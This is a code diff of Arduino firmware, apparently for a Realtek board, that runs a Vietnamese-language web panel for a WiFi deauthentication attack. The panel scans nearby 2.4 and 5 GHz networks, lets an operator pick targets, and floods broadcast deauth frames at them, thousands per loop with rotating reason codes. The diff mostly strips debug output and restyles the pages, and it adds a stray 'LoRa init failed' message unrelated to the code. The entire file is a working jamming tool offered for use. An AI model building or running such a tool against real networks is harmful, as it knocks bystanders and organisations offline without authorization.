@@ -4,7 +4,7 @@
 #include "wifi_cust_tx.h"
 #include "wifi_util.h"
 #include "wifi_structures.h"
-#include "debug.h"
+// #include "debug.h"
 #include "WiFi.h"
 #include "WiFiServer.h"
 #include "WiFiClient.h"
@@ -18,10 +18,10 @@ typedef struct {
 
 
 
-                              char *ssid = "Deauther_2-4_5GHZ"; //Mặc Định
-                              char *pass = "123456789";
- 
-                                                                     
+char *ssid = "Deauther_2-4_5GHZ";
+char *pass = "123456789";
+
+
 
 int current_channel = 1;
 std::vector<WiFiScanResult> scan_results;
@@ -49,14 +49,13 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   return RTW_SUCCESS;
 }
 int scanNetworks() {
-  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
   scan_results.clear();
   if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
     delay(500);
-    DEBUG_SER_PRINT(" done!\n");
+  
     return 0;
   } else {
-    DEBUG_SER_PRINT(" failed!\n");
+  
     return 1;
   }
 }
@@ -108,57 +107,59 @@ String makeRedirect(String url) {
   response += "Location: " + url;
   return response;
 }
-
-
 void handleRoot(WiFiClient &client) {
 String html = "<html><head>";
 html += "<meta charset='UTF-8'>";
 html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"; 
 html += "<style>";
-html += "body { font-family: Arial, sans-serif; background-color: #FFFFFF; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; box-sizing: border-box; }";
-html += "h1 { text-align: center; color: #FF0000; font-size: 50px; font-weight: bold; word-wrap: break-word; white-space: normal; text-transform: uppercase; text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3); margin: 10px; background-color: #FFD700; padding: 15px; border-radius: 20px; box-shadow: 3px 3px 10px rgba(0, 0, 0, 0.2); }";
-html += "h2 { text-align: center; color: #FF0000; margin: 10px; padding: 10px; }"; 
-html += "h3 { text-align: center; color: #FF0000; font-size: 24px; font-weight: bold; text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.2); background-color: #FFD700; padding: 10px; border-radius: 15px; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.2); display: inline-block; }";
+html += "body { font-family: Arial, sans-serif; background-color: #FFFFCC; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; box-sizing: border-box; }";
+html += "h1 { text-align: center; color: #388e3c; font-size: 50px; font-weight: bold; word-wrap: break-word; white-space: normal; text-transform: uppercase; text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3); margin: 10px; background-color: #cddc39; padding: 10px; border-radius: 10px; }";
+html += "h2, h3 { text-align: center; color: #388e3c; margin: 10px; }";
+html += "h2 { font-size: 18px; background-color: #cddc39; padding: 8px; border-radius: 5px; }"; 
+html += "h3 { font-size: 20px; font-weight: bold; color: #388e3c; background-color: #cddc39; padding: 8px; border-radius: 5px; }"; 
 html += "div { text-align: center; padding: 10px; width: 100%; max-width: 900px; box-sizing: border-box; }";
-html += "table { width: 100%; border-collapse: collapse; margin-top: 20px; box-sizing: border-box; }"; 
-html += "th, td { padding: 12px; text-align: left; border: 1px solid #ddd; }";
-html += "tr:nth-child(even) { background-color: #f9f9f9; }";
-html += "th { background-color: #FFD700; color: black; }"; 
-html += "button { padding: 12px 20px; background-color: #FFD700; border: none; color: black; cursor: pointer; margin: 10px 0; border-radius: 15px; font-size: 16px; font-weight: bold; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.2); transition: 0.3s; }";
-html += "button:hover { background-color: #FFC107; transform: scale(1.05); }";
-html += "input[type='text'], select { padding: 10px; width: 100%; margin-top: 10px; box-sizing: border-box; border-radius: 10px; text-align: center; border: 2px solid #FFD700; background-color: #FFF8DC; font-size: 16px; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); }";
-html += "select { text-align: center; color: black; }"; 
+html += "table { width: 100%; border-collapse: collapse; margin-top: 20px; box-sizing: border-box; overflow-x: auto; display: block; }";
+html += "th, td { padding: 10px; text-align: left; border: 1px solid #ddd; }";
+html += "tr:nth-child(even) { background-color: #f2f2f2; }";
+html += "th { background-color: #388e3c; color: white; }";
+html += "button { padding: 10px 20px; background-color: #388e3c; border: none; color: white; cursor: pointer; margin: 5px 0; }";
+html += "button:hover { background-color: #45a049; }";
+html += "input[type='text'], select { padding: 8px; width: 100%; margin-top: 10px; box-sizing: border-box; border-radius: 5px; text-align: center; }";
+html += "select { border: 2px solid #388e3c; text-align: center; }"; 
 html += "form { margin-bottom: 20px; }";
-html += "a { color: #FF0000; text-decoration: underline; font-weight: bold; border-radius: 5px; transition: 0.3s; }";
-html += "a:hover { text-decoration: underline; color: #C21807; }";
+html += "a { color: #388e3c; text-decoration: none; }";
+html += "a:hover { text-decoration: underline; }";
 html += "@media screen and (max-width: 600px) { ";
 html += "  h1 { font-size: 36px; } ";
 html += "  table th, table td { font-size: 12px; padding: 5px; } ";
-html += "  button { padding: 10px 15px; font-size: 14px; } ";
+html += "  button { padding: 8px 15px; font-size: 14px; } ";
 html += "  select { font-size: 14px; } ";
 html += "} ";
 html += "</style>";
-
 html += "<script>";
-html += "function changeColor(select) { select.style.backgroundColor = 'red'; }";
+html += "function changeBorderColor() {";
+html += "  var selectElement = document.querySelector('select[name=\"net_num\"]');";
+html += "  var selectedOption = selectElement.options[selectElement.selectedIndex];";
+html += "  selectElement.style.borderColor = '#FFCC00';";
+html += "  selectElement.style.backgroundColor = '#FF0000';";
+html += "  selectedOption.style.color = '#FFFF00';";
+html += "  selectElement.style.color = '#FFFF00';";
+html += "}";
 html += "</script>";
-
-
 html += "</head><body>";
 html += "<div>";
 html += "<h1>Trang Tấn Công Deauth</h1>";
-html += "<h2>📡 Danh sách mạng mục tiêu ↴ </h2>"; 
+html += "<h2>Danh sách mạng wifi mục tiêu ↴ </h2>";
 html += "<table><tr><th>Số</th><th>SSID</th><th>BSSID</th><th>Kênh</th><th>RSSI</th><th>Tần Số</th></tr>";
 for (size_t i = 0; i < scan_results.size(); i++) {
   html += "<tr><td>" + String(i + 1) + "</td><td>" + scan_results[i].ssid + "</td><td>" + scan_results[i].bssid_str + "</td><td>" + String(scan_results[i].channel) + "</td><td>" + String(scan_results[i].rssi) + "</td><td>" + ((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td></tr>";
 }
 html += "</table>";
-html += "<form method='post' action='/rescan'><button type='submit'>🔎 Quét lại các mạng 🔍</button></form>";
-html += "<h3>💥 Bắt Đầu Tấn Công Deauth 💥</h3>";
+html += "<form method='post' action='/rescan'><button type='submit'>Quét lại các mạng</button></form>";
+html += "<h3>Bắt đầu Tấn Công Deauth</h3>";
 html += "<form method='post' action='/deauth'>";
-html += "<a href='/status'>🕵️‍♂️ Xem trạng thái đang tấn công Deauth 🕵️‍♂️ </a><br><br>";
-html += "Chọn mạng 🎯 : <select name='net_num' size='5' onchange='changeColor(this)'>";
-
+html += "<a href='/status'>Xem trạng thái đang tấn công</a><br><br>";
+html += "Chọn mạng: <select name='net_num' size='5' onchange='changeBorderColor()'>"; 
 for (size_t i = 0; i < scan_results.size(); i++) {
   String frequency = (scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz"; 
   String displayText = String(i + 1) + ". " + scan_results[i].ssid + " (" + frequency + ")";
@@ -171,29 +172,13 @@ for (size_t i = 0; i < scan_results.size(); i++) {
 html += "</select><br><br>";
 int random_reason = random(0, 24);
 html += "<input type='hidden' name='reason' value='" + String(random_reason) + "'>";
-html += "<button type='submit'>Bắt Đầu Ngắt Kết Nối 🚀</button></form>";
-html += "<form method='post' action='/stop'><button type='submit'>Dừng Ngắt Kết Nối  🛑</button></form>";
+html += "<button type='submit'>Bắt Đầu Tấn Công Deauth</button></form>";
+html += "<form method='post' action='/stop'><button type='submit'>Dừng Tấn Công Deauth</button></form>";
 html += "</div></body></html>";
-String response = makeResponse(200, "text/html");
-response += html;
-client.write(response.c_str());
+  String response = makeResponse(200, "text/html");
+  response += html;
+  client.write(response.c_str());
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 void handle404(WiFiClient &client) {
   client.write(makeRedirect("/").c_str());
 }
@@ -202,44 +187,47 @@ void startDeauth(int network_num) {
   current_channel = scan_results[network_num].channel;
   deauth_running = true;
   memcpy(deauth_bssid, scan_results[network_num].bssid, 6);
-  DEBUG_SER_PRINT("Starting Deauth-Attack on: " + scan_results[network_num].ssid + "\n");
+ 
   digitalWrite(LED_R, HIGH);
   digitalWrite(LED_B, HIGH);
 }
 void setup() {
+  Serial.begin(115200);
   pinMode(LED_R, OUTPUT);
   pinMode(LED_G, OUTPUT);
   pinMode(LED_B, OUTPUT);
-  DEBUG_SER_INIT();
+  
   randomSeed(millis()); 
      IPAddress local_ip(192, 168, 4, 1); 
      IPAddress gateway(192, 168, 4, 1);  
      IPAddress subnet(255, 255, 255, 0); 
      WiFi.config(local_ip, gateway, subnet);
- WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str());
+
+
+WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str()); //Không ẩn đoạn này thì hiện tên wifi
+
+
+
+
+
   if (scanNetworks() != 0) {
     while(true) delay(1000);
   }
-  #ifdef DEBUG
-  for (size_t i = 0; i < scan_results.size(); i++) {
-    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
-    for (int j = 0; j < 6; j++) {
-      if (j > 0) DEBUG_SER_PRINT(":");
-      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
-    }
-    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
-    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
-  }
-  #endif
+
+   Serial.println("❌ LoRa init failed!");
+
   server.begin();
   digitalWrite(LED_G, LOW);
 }
 unsigned long deauth_start_time = 0; 
 std::vector<uint16_t> reason_codes = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24};
-int reason_index = 0;  // Biến toàn cục để theo dõi vị trí của mã lý do đang được gửi
+
+int reason_index = 0; 
+
 void handleDeauth(WiFiClient &client, String &request) {
     std::map<String, String> post_data = parsePost(request);
     deauth_targets.clear();
+
     if (post_data.find("net_num") != post_data.end()) {
         String target_ids = post_data["net_num"];
         int start = 0, end = 0;
@@ -259,70 +247,106 @@ void handleDeauth(WiFiClient &client, String &request) {
     if (!deauth_targets.empty()) {
         deauth_running = true;
         deauth_start_time = millis();
-        DEBUG_SER_PRINT("Deauth started at " + String(deauth_start_time / 1000) + " seconds.\n");
+       
 
         while (deauth_running) {  
             for (int target : deauth_targets) {
                 if (target >= 0 && target < static_cast<int>(scan_results.size())) {
                     memcpy(deauth_bssid, scan_results[target].bssid, 6);
 
-
-
-
-
-
-
                     // Gửi gói tin với từng mã lý do theo thứ tự
-                    for (int i = 0; i < 6000; i++) {
+                    for (int i = 0; i < 7000; i++) {
                         wifi_tx_deauth_frame(deauth_bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", reason_codes[reason_index]);
                     }
 
-
-
-
-
-
-
-                    DEBUG_SER_PRINT("Deauth sent to: " + scan_results[target].ssid + " with reason code: " + String(reason_codes[reason_index]) + "\n");
+                  
                 } else {
-                    DEBUG_SER_PRINT("Invalid target index: " + String(target) + "\n");
+                   
                 }
             }
-
-            // Chuyển sang mã lý do tiếp theo trong danh sách
             reason_index = (reason_index + 1) % reason_codes.size();
         }
         client.write(makeRedirect("/status").c_str());
     } else {
-        DEBUG_SER_PRINT("No valid targets for deauth.\n");
+       
         client.write(makeRedirect("/").c_str());
     }
 }
 
 
-
+std::vector<int> stopped_targets;
+void handleStopDeauth(WiFiClient &client) {
+  digitalWrite(LED_R, LOW);
+  digitalWrite(LED_B, HIGH);
+  delay(3000);
+  digitalWrite(LED_B, LOW);
+  deauth_running = false;
+  stopped_targets = deauth_targets;
+  deauth_targets.clear(); 
+  String response = makeResponse(200, "text/html");
+  response += "<html><head>";
+response += "<meta charset='UTF-8'>";
+response += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
+response += "<style>";
+response += "body { font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; background-color: #fffacd; }";
+response += "table { width: 90%; margin: 20px auto; border-collapse: collapse; }";
+response += "th, td { padding: 10px; text-align: left; border: 1px solid #ddd; }";
+response += "th { background-color: #4CAF50; color: white; }";
+response += "tr:nth-child(even) { background-color: #f2f2f2; }";
+response += "</style>";
+response += "</head><body>";
+response += "<h1>Tấn công Deauth đã dừng</h1>"; 
+if (!stopped_targets.empty()) {
+    response += "<h2>Các mục tiêu đã dừng tấn công:</h2>";
+    response += "<table><tr><th>Số</th><th>SSID</th><th>BSSID</th><th>Kênh</th><th>Băng tần</th></tr>";    
+    for (size_t i = 0; i < stopped_targets.size(); i++) {
+        int target_index = stopped_targets[i];
+        if (target_index >= 0 && target_index < static_cast<int>(scan_results.size())) {
+            String band = "Không xác định"; 
+            int channel = scan_results[target_index].channel;
+            if (channel >= 1 && channel <= 14) {
+                band = "2.4 GHz";
+            } else if (channel >= 36 && channel <= 165) {
+                band = "5 GHz";
+            }
+            response += "<tr>";
+            response += "<td>" + String(i + 1) + "</td>";
+            response += "<td>" + scan_results[target_index].ssid + "</td>";
+            response += "<td>" + scan_results[target_index].bssid_str + "</td>";
+            response += "<td>" + String(channel) + "</td>";
+            response += "<td>" + band + "</td>";
+            response += "</tr>";
+        }
+    }
+    response += "</table>";
+} else {
+    response += "<p>Không có mục tiêu nào được dừng tấn công.</p>";
+}
+response += "<a href='/'>Quay lại Tấn Công Deauth</a>";
+response += "</body></html>";
+  client.write(response.c_str());
+}
 int current_target = -1;
 void handleStatus(WiFiClient &client) {
   String html = "<html><head>";
 html += "<meta charset='UTF-8'>";
 html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
 html += "<style>";
-html += "body { font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; font-size: 4vw; background-color: #FFFFFF; }"; 
+html += "body { font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; font-size: 4vw; background-color: #FFFFE0; }"; 
 html += "table { width: 90%; border-collapse: collapse; margin-top: 20px; margin-left: auto; margin-right: auto; }"; 
 html += "th, td { padding: 12px; text-align: center; border: 1px solid #ddd; font-size: 4vw; }";
-html += "th { background-color: #FFD700; color: black; }";
-html += "tr:nth-child(even) { background-color: #f9f9f9; }";
-html += "h1 { text-align: center; font-size: 7vw; color: #FF0000; font-weight: bold; text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3); }";
-html += "h2 { text-align: center; font-size: 3vw; color: #FF0000; }";
-html += "a { display: inline-block; margin-top: 20px; font-size: 4vw; text-decoration: underline; color: #FF0000; font-weight: bold; }";
-html += "a:hover { color: #C21807; }";
+html += "th { background-color: #4CAF50; color: white; }";
+html += "tr:nth-child(even) { background-color: #f2f2f2; }";
+html += "h1, h2 { text-align: center; font-size: 6vw; }";
+html += "a { display: inline-block; margin-top: 20px; font-size: 4vw; text-decoration: none; color: #4CAF50; }";
 html += "</style>";
 html += "</head><body>";
-html += "<h1>Trang Trạng Thái Tấn Công Deauth</h1>";
+html += "<h1>Trạng Thái Tấn Công Deauth</h1>";
+
 if (deauth_running) {
     html += "<h2>Chi tiết tấn công các mục tiêu Deauth ↴ :</h2>";
     html += "<table>";
-    html += "<tr><th>Số</th><th>SSID</th><th>BSSID</th><th>Kênh</th><th>Lý do</th><th>Trạng thái</th></tr>";
+    html += "<tr style='background-color: #f2f2f2;'><th>Số</th><th>SSID</th><th>BSSID</th><th>Kênh</th><th>Lý do</th><th>Trạng thái</th></tr>";
 
     for (size_t i = 0; i < deauth_targets.size(); i++) {
         int target_index = deauth_targets[i];
@@ -348,75 +372,6 @@ html += "</body></html>";
    response += html;
    client.write(response.c_str());
 }
-
-
-
-
-
-
-
-std::vector<int> stopped_targets;
-void handleStopDeauth(WiFiClient &client) {
-  digitalWrite(LED_R, LOW);
-  digitalWrite(LED_B, HIGH);
-  delay(3000);
-  digitalWrite(LED_B, LOW);
-  deauth_running = false;
-  stopped_targets = deauth_targets;
-  deauth_targets.clear(); 
-  String response = makeResponse(200, "text/html");
-  response += "<html><head>";
-  response += "<meta charset='UTF-8'>";
-  response += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
-  response += "<style>";
-  response += "body { font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; background-color: #FFFFFF; }";
-  response += "table { width: 90%; margin: 20px auto; border-collapse: collapse; }";
-  response += "th, td { padding: 10px; text-align: left; border: 1px solid #ddd; }";
-  response += "th { background-color: #FFD700; color: black; }";
-  response += "tr:nth-child(even) { background-color: #f9f9f9; }";
-  response += "h1 { text-align: center; color: #FF0000; font-size: 10vw; font-weight: bold; word-wrap: break-word; white-space: normal; text-transform: uppercase; text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3); margin: 10px; background-color: #FFD700; padding: 15px; border-radius: 20px; box-shadow: 3px 3px 10px rgba(0, 0, 0, 0.2); }";
-  response += "h2 { text-align: center; color: #FF0000; margin: 5px; padding: 5px; }";
-  response += "a { color: #FF0000; text-decoration: underline; font-weight: bold; border-radius: 5px; transition: 0.3s; }";
-  response += "a:hover { text-decoration: underline; color: #C21807; }";
-  response += "</style>";
-  response += "</head><body>";
-  response += "<h1>Trang Dừng Tấn Công Deauth</h1>"; 
-  if (!stopped_targets.empty()) {
-      response += "<h2>Các mục tiêu đã dừng tấn công:</h2>";
-      response += "<table><tr><th>Số</th><th>SSID</th><th>BSSID</th><th>Kênh</th><th>Băng tần</th></tr>";    
-      for (size_t i = 0; i < stopped_targets.size(); i++) {
-          int target_index = stopped_targets[i];
-          if (target_index >= 0 && target_index < static_cast<int>(scan_results.size())) {
-              String band = "Không xác định"; 
-              int channel = scan_results[target_index].channel;
-              if (channel >= 1 && channel <= 14) {
-                  band = "2.4 GHz";
-              } else if (channel >= 36 && channel <= 165) {
-                  band = "5 GHz";
-              }
-              response += "<tr>";
-              response += "<td>" + String(i + 1) + "</td>";
-              response += "<td>" + scan_results[target_index].ssid + "</td>";
-              response += "<td>" + scan_results[target_index].bssid_str + "</td>";
-              response += "<td>" + String(channel) + "</td>";
-              response += "<td>" + band + "</td>";
-              response += "</tr>";
-          }
-      }
-      response += "</table>";
-  } else {
-      response += "<p>Không có mục tiêu nào được dừng tấn công, Hãy tấn công và quay lại đây !</p>";
-  }
-  response += "<a href='/'>Quay lại trang Tấn Công Deauth</a>";
-  response += "</body></html>";
-  client.write(response.c_str());
-}
-
-
-
-
-
-
 int led_state = 0;
 void loop() {
   WiFiClient client = server.available();
@@ -428,9 +383,9 @@ void loop() {
       delay(1);
       digitalWrite(LED_G, LOW);
     }
-    DEBUG_SER_PRINT("Request received: " + request);
+  
     String path = parseRequest(request);
-    DEBUG_SER_PRINT("Requested path: " + path + "\n");
+   
     if (path == "/") {
       handleRoot(client); 
  } else if (path == "/status") {
@@ -451,9 +406,9 @@ for (int target : deauth_targets) {
     if (target >= 0 && target < static_cast<int>(scan_results.size())) {
         memcpy(deauth_bssid, scan_results[target].bssid, 6);
         wifi_tx_deauth_frame(deauth_bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
-        DEBUG_SER_PRINT("Deauth started for: " + scan_results[target].ssid + "\n");
+       
     } else {
-        DEBUG_SER_PRINT("Invalid target index: " + String(target) + "\n");
+      
     }
 }
     int network_num;
@@ -483,7 +438,7 @@ for (int target : deauth_targets) {
             }
         }
     } else {
-        DEBUG_SER_PRINT("Received invalid post request!\n"); 
+       
         client.write(makeRedirect("/").c_str()); 
     }
     } else if (path == "/stop") {
@@ -492,21 +447,33 @@ for (int target : deauth_targets) {
 
 else if (path == "/rescan") {
     if (scanNetworks() == 0) {
-        DEBUG_SER_PRINT("Scan successful, redirecting to home page.\n");
+       
     } else {
-        DEBUG_SER_PRINT("Scan failed, redirecting to home page.\n");
+       
     }
     client.write(makeRedirect("/").c_str());
 }
   }
+   
+
    if (deauth_running) {
     for (int target : deauth_targets) {
         if (target >= 0 && target < static_cast<int>(scan_results.size())) {
             memcpy(deauth_bssid, scan_results[target].bssid, 6);
             wifi_tx_deauth_frame(deauth_bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
-            DEBUG_SER_PRINT("Deauth packet sent to: " + scan_results[target].ssid + "\n");
+
+            // In BSSID ra Serial
+            char bssid_str[18];
+            snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+                     scan_results[target].bssid[0], scan_results[target].bssid[1],
+                     scan_results[target].bssid[2], scan_results[target].bssid[3],
+                     scan_results[target].bssid[4], scan_results[target].bssid[5]);
+            Serial.print("⚡ Đang gửi Deauth đến BSSID: ");
+            Serial.println(bssid_str);
         }
     }
+}
 
-  }
+
+
 }
